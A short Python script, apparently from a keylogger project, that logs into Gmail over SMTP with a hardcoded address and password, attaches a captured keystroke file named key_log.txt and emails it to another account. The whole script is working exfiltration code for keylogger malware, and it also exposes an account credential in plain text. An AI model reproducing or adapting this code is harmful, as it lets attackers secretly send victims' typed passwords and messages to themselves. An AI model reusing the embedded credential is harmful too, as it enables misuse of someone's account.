from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

def gmail_login(username,password):
    smtp_server_name="smtp.gmail.com"
    port_number=587
    server=smtplib.SMTP(host=smtp_server_name,port=port_number)
    server.connect(host=smtp_server_name,port=port_number)
    server.starttls()
    server.login(user=username,password=password)
    return server

msg=MIMEMultipart()
msg['Subject']="Test Mail"
msg['From']= 'ecomapp55@gmail.com'
msg['To']='ecomapp66@gmail.com'
msg['Bcc']=''

body="Hello"
msg.attach(MIMEText(body,'plain'))
file_path=r"D:\Python Projets\KeyLog\Project"
file_name="key_log.txt"
file=open(file_path+"\\"+file_name,"rb")

payload=MIMEBase('application','octet-stream')
payload.set_payload(file.read())
file.close()
encoders.encode_base64(payload)
payload.add_header('Content-Disposition','attachment',filename=file_name)
msg.attach(payload)


server=gmail_login(username='ecomapp55@gmail.com',password='xtmdqynwqxipntim')
server.send_message(msg)
server.quit()
print("email sent")






